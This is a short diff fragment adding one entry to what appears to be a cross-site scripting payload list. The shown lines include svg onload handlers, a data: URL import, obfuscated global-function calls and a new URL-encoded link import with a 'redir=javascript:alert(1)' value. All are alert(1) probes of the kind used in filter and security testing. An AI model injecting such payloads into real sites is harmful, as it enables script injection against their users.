@@ -48,3 +48,4 @@ import('data:text/javascript,alert(1)')
 <svg•onload=alert(1)>
 this[Object["keys"](this)[146]](1)
 this[Object["keys"](this)[5]](1)
+<link%20id%3Dp1%20rel%3Dimport%20href%3D%2Fdom%2Fsinks.html>&redir=javascript%3Aalert(1)
